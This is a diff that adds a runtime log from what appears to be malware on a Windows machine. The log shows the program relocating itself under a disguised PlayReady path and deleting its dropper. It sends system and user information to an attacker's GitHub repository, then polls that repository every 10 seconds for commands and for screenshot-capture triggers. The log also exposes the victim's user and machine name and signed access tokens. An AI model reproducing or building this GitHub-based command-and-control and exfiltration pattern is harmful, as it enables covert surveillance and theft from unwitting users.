@@ -1,0 +1,802 @@
+[2026-08-04 03:02:08.787] [AUTH] Using PAT prefix: github_p
+[2026-08-04 03:02:08.789] [TRACE] main: start
+[2026-08-04 03:02:08.790] [TRACE] is_privileged_account: start
+[2026-08-04 03:02:08.791] [TRACE] is_privileged_account: SID check rev=1 count=5 auth=5 sub=21
+[2026-08-04 03:02:08.792] Client starting - Running as User
+[2026-08-04 03:02:08.793] [TRACE] process_startup_arguments: start
+[2026-08-04 03:02:08.793] Elevating
+[2026-08-04 03:02:08.794] Skipping elevation request (UAC disabled) ? running without elevation
+[2026-08-04 03:02:08.794] [TRACE] main: current_exe=C:\Users\DEEBYT~1\AppData\Local\Temp\stage_download.exe
+[2026-08-04 03:02:08.795] [TRACE] get_playready_dir: resolving target directory
+[2026-08-04 03:02:08.796] Wrong location. Relocating
+[2026-08-04 03:02:08.797] [TRACE] migrate_and_restart: start
+[2026-08-04 03:02:08.797] Current exe: "C:\\Users\\DEEBYT~1\\AppData\\Local\\Temp\\stage_download.exe"
+[2026-08-04 03:02:08.798] Args: ["C:\\Users\\DEEBYT~1\\AppData\\Local\\Temp\\stage_download.exe"]
+[2026-08-04 03:02:08.798] [TRACE] get_playready_dir: resolving target directory
+[2026-08-04 03:02:08.799] Target dir: "C:\\Users\\DEEBYTE COMPUTERS\\AppData\\Local\\Microsoft\\PlayReady"
+[LOG 2026-08-04 03:02:08.800] Target already exists, spawning existing instance
+[LOG 2026-08-04 03:02:08.808] Spawned existing instance, exiting
+[2026-08-04 03:02:08.823] [AUTH] Using PAT prefix: github_p
+[2026-08-04 03:02:08.825] [TRACE] main: start
+[2026-08-04 03:02:08.826] [TRACE] is_privileged_account: start
+[2026-08-04 03:02:08.827] [TRACE] is_privileged_account: SID check rev=1 count=5 auth=5 sub=21
+[2026-08-04 03:02:08.828] Client starting - Running as User
+[2026-08-04 03:02:08.829] [TRACE] process_startup_arguments: start
+[LOG 2026-08-04 03:02:08.829] Cleanup requested for: C:\Users\DEEBYT~1\AppData\Local\Temp\stage_download.exe
+[LOG 2026-08-04 03:02:08.831] Original file deleted successfully
+[2026-08-04 03:02:08.832] Elevating
+[2026-08-04 03:02:08.832] Skipping elevation request (UAC disabled) ? running without elevation
+[2026-08-04 03:02:08.833] [TRACE] main: current_exe=C:\Users\DEEBYTE COMPUTERS\AppData\Local\Microsoft\PlayReady\dbengin.exe
+[2026-08-04 03:02:08.834] [TRACE] get_playready_dir: resolving target directory
+[2026-08-04 03:02:08.835] Running from target location
+[2026-08-04 03:02:08.836] [TRACE] verify_unique_execution: creating mutex
+[2026-08-04 03:02:08.837] [TRACE] verify_unique_execution: unique instance confirmed
+[2026-08-04 03:02:08.837] Running without elevated privileges
+[2026-08-04 03:02:08.838] Collecting system info...
+[2026-08-04 03:02:08.839] [TRACE] gather_and_store_environment_data: start
+[2026-08-04 03:02:08.839] [TRACE] retrieve_current_user: start
+[2026-08-04 03:02:08.841] [TRACE] retrieve_current_user: DEEBYTE COMPUTERS
+[2026-08-04 03:02:08.842] [TRACE] generate_system_identifier: computing prefix
+[2026-08-04 03:02:08.843] [TRACE] retrieve_current_user: start
+[2026-08-04 03:02:08.844] [TRACE] retrieve_current_user: DEEBYTE COMPUTERS
+[2026-08-04 03:02:08.845] [TRACE] normalize_filename: input=DESKTOP-SDBADVS
+[2026-08-04 03:02:08.846] [TRACE] normalize_filename: input=DEEBYTE COMPUTERS
+[2026-08-04 03:02:08.847] Checking for existing file at https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/files/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS_system_info.txt
+[2026-08-04 03:02:09.392] SHA GET status: 200 OK
+[2026-08-04 03:02:09.393] SHA GET body (snippet): {"name":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS_system_info.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/files/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS_system_info.txt","sha":"739ff549205c5e4dc08bced7e80bec4aba13fa17","size":338,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/files/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS_system_info.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/files/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS_system_info.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/739ff549205c5e4dc08bced7e80bec4aba13fa17","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/files/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS_system_info.txt?token=CDJNJFRMH4YDTR2NCLJ32Z3KOEIB3AA","type":"file","content":"PT09PT0gU1lTVEVNIElORk8gPT09PT0KVXNlcm5hbWU6IERFRUJZVEUgQ09N\nUFVURVJTCkNvbXB1dGVyIE5hbWU6IERFU0tUT1AtU0RCQURWUwpPUzogd2lu\nZG93cwpBcmNoaXRlY3R1cmU6IHg4Nl82NApPUyBWZXJzaW9uOiBXaW5kb3dz\nICh2ZXJzaW9uIG5vdCByZXRyaWV2ZWQpCkN1cnJlbnQgRGlyZWN0b3J5OiBD\nOlxVc2Vyc1xERUVCWVRFIENPTVBVVEVSU1xBcHBEYXRhXExvY2FsXFRlbXBc\ncGlwLXJlcS1idWlsZC1kMmNkbjB3bQpFeGVjdXRhYmxlIFBhdGg6IEM6XFVz\nZXJzXERFRUJZVEUgQ09NUFVURVJTXEFwcERhdGFcTG9jYWxcTWljcm9zb2Z0\nXFBsYXlSZWFkeVxkYmVuZ2luLmV4ZQo=\n","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/files/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS_system_info.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/739ff549205c5e4dc08bced7e80bec4aba13fa17","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/files/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS_system_info.txt"}}
+[2026-08-04 03:02:09.393] GitHub PUT attempt 1/3 to https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/files/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS_system_info.txt
+[2026-08-04 03:02:10.324] Uploaded to GitHub -> DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/files/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS_system_info.txt (status 200 OK)
+[2026-08-04 03:02:11.414] ? VERIFIED: File confirmed on GitHub
+[2026-08-04 03:02:11.415] Polling every 10 seconds
+[2026-08-04 03:02:11.416] MAIN LOOP STARTING - About to enter polling loop
+[2026-08-04 03:02:11.416] [TRACE] main loop: iteration start
+[2026-08-04 03:02:11.417] 
+--- POLL ITERATION START ---
+[2026-08-04 03:02:11.417] [TRACE] initialize_storage_directory: start
+[2026-08-04 03:02:11.998] commands.txt already exists in DESKTOP-SDBADVS_DEEBYTE_COMPUTERS
+[2026-08-04 03:02:12.420] screenshots/config.json already exists
+[2026-08-04 03:02:13.423] Fetching path list from GitHub...
+[2026-08-04 03:02:13.424] [COMMANDS] Fetching from: https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main
+[2026-08-04 03:02:13.425] [COMMANDS] GET attempt 1/4
+[2026-08-04 03:02:13.966] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:02:13.967] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFULZMPS3H7ZUOCSL7TKOEICFAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:02:13.967] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:02:13.968] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:02:13.968] [COMMANDS] Decoded content empty on attempt 1
+[2026-08-04 03:02:14.969] [COMMANDS] GET attempt 2/4
+[2026-08-04 03:02:15.355] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:02:15.356] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFWNNJCWCLOFW6KC26TKOEICHAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:02:15.357] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:02:15.358] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:02:15.358] [COMMANDS] Decoded content empty on attempt 2
+[2026-08-04 03:02:17.360] [COMMANDS] GET attempt 3/4
+[2026-08-04 03:02:17.761] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:02:17.762] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFQR7QEHSPJD6O4Y7X3KOEICNAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:02:17.763] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:02:17.764] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:02:17.764] [COMMANDS] Decoded content empty on attempt 3
+[2026-08-04 03:02:20.765] [COMMANDS] GET attempt 4/4
+[2026-08-04 03:02:21.124] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:02:21.125] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFXPIRPD2WCRMOZTMVTKOEICTAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:02:21.125] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:02:21.126] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:02:21.126] [COMMANDS] Decoded content empty on attempt 4
+[2026-08-04 03:02:21.127] [COMMANDS] Total commands fetched: 0
+[2026-08-04 03:02:21.128] SUCCESS: Found 0 command(s) to process
+[2026-08-04 03:02:21.129] Processing screenshot config...
+[2026-08-04 03:02:21.129] [TRACE] handle_capture_settings: start
+[2026-08-04 03:02:21.130] [SCREENSHOT] Fetching config from: https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/screenshots/config.json?ref=main
+[2026-08-04 03:02:21.679] [SCREENSHOT] Config response status: 200 OK
+[2026-08-04 03:02:21.680] [SCREENSHOT] Config parsed: trigger=false, number=3, delay=100
+[2026-08-04 03:02:21.680] [SCREENSHOT] capture_screenshots called: trigger=false, number=3
+[LOG 2026-08-04 03:02:21.681] [SCREENSHOT] initiate_image_capture start: trigger=false, number=3, delay_ms=100, prefix=DESKTOP-SDBADVS_DEEBYTE_COMPUTERS
+[LOG 2026-08-04 03:02:21.682] [SCREENSHOT] Trigger is false, skipping capture
+[2026-08-04 03:02:21.683] Sleeping for 10 seconds...
+[2026-08-04 03:02:31.686] [TRACE] main loop: iteration start
+[2026-08-04 03:02:31.687] 
+--- POLL ITERATION START ---
+[2026-08-04 03:02:31.688] [TRACE] initialize_storage_directory: start
+[2026-08-04 03:02:32.214] commands.txt already exists in DESKTOP-SDBADVS_DEEBYTE_COMPUTERS
+[2026-08-04 03:02:32.589] screenshots/config.json already exists
+[2026-08-04 03:02:33.592] Fetching path list from GitHub...
+[2026-08-04 03:02:33.593] [COMMANDS] Fetching from: https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main
+[2026-08-04 03:02:33.594] [COMMANDS] GET attempt 1/4
+[2026-08-04 03:02:34.119] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:02:34.120] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFTJ6V6J67H4EYSC6LDKOEIDNAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:02:34.121] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:02:34.122] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:02:34.123] [COMMANDS] Decoded content empty on attempt 1
+[2026-08-04 03:02:35.124] [COMMANDS] GET attempt 2/4
+[2026-08-04 03:02:35.491] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:02:35.492] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFSH5MFZ5ZR4YJBTAQDKOEIDPAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:02:35.493] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:02:35.494] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:02:35.495] [COMMANDS] Decoded content empty on attempt 2
+[2026-08-04 03:02:37.496] [COMMANDS] GET attempt 3/4
+[2026-08-04 03:02:37.860] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:02:37.861] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFSMTQMZK4NUA72EKD3KOEIDVAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:02:37.862] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:02:37.863] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:02:37.864] [COMMANDS] Decoded content empty on attempt 3
+[2026-08-04 03:02:40.866] [COMMANDS] GET attempt 4/4
+[2026-08-04 03:02:41.276] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:02:41.277] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFT4ALANG72JUJJETADKOEID3AA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:02:41.278] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:02:41.279] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:02:41.279] [COMMANDS] Decoded content empty on attempt 4
+[2026-08-04 03:02:41.280] [COMMANDS] Total commands fetched: 0
+[2026-08-04 03:02:41.283] SUCCESS: Found 0 command(s) to process
+[2026-08-04 03:02:41.284] Processing screenshot config...
+[2026-08-04 03:02:41.285] [TRACE] handle_capture_settings: start
+[2026-08-04 03:02:41.286] [SCREENSHOT] Fetching config from: https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/screenshots/config.json?ref=main
+[2026-08-04 03:02:41.816] [SCREENSHOT] Config response status: 200 OK
+[2026-08-04 03:02:41.818] [SCREENSHOT] Config parsed: trigger=false, number=3, delay=100
+[2026-08-04 03:02:41.820] [SCREENSHOT] capture_screenshots called: trigger=false, number=3
+[LOG 2026-08-04 03:02:41.822] [SCREENSHOT] initiate_image_capture start: trigger=false, number=3, delay_ms=100, prefix=DESKTOP-SDBADVS_DEEBYTE_COMPUTERS
+[LOG 2026-08-04 03:02:41.824] [SCREENSHOT] Trigger is false, skipping capture
+[2026-08-04 03:02:41.829] Sleeping for 10 seconds...
+[2026-08-04 03:02:51.833] [TRACE] main loop: iteration start
+[2026-08-04 03:02:51.836] 
+--- POLL ITERATION START ---
+[2026-08-04 03:02:51.838] [TRACE] initialize_storage_directory: start
+[2026-08-04 03:02:52.374] commands.txt already exists in DESKTOP-SDBADVS_DEEBYTE_COMPUTERS
+[2026-08-04 03:02:52.746] screenshots/config.json already exists
+[2026-08-04 03:02:53.749] Fetching path list from GitHub...
+[2026-08-04 03:02:53.751] [COMMANDS] Fetching from: https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main
+[2026-08-04 03:02:53.752] [COMMANDS] GET attempt 1/4
+[2026-08-04 03:02:54.336] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:02:54.339] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFQMW4QEGTN4K6JP4ZTKOEIEVAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:02:54.346] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:02:54.350] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:02:54.352] [COMMANDS] Decoded content empty on attempt 1
+[2026-08-04 03:02:55.354] [COMMANDS] GET attempt 2/4
+[2026-08-04 03:02:55.716] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:02:55.718] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFUQSCHXNYLP3Y5W2HLKOEIEZAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:02:55.720] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:02:55.732] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:02:55.747] [COMMANDS] Decoded content empty on attempt 2
+[2026-08-04 03:02:57.751] [COMMANDS] GET attempt 3/4
+[2026-08-04 03:02:58.126] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:02:58.127] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFQ7HPVBK7GXR6YUSODKOEIE5AA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:02:58.128] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:02:58.129] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:02:58.130] [COMMANDS] Decoded content empty on attempt 3
+[2026-08-04 03:03:01.132] [COMMANDS] GET attempt 4/4
+[2026-08-04 03:03:01.490] [COMMANDS] Response status: 200 OK
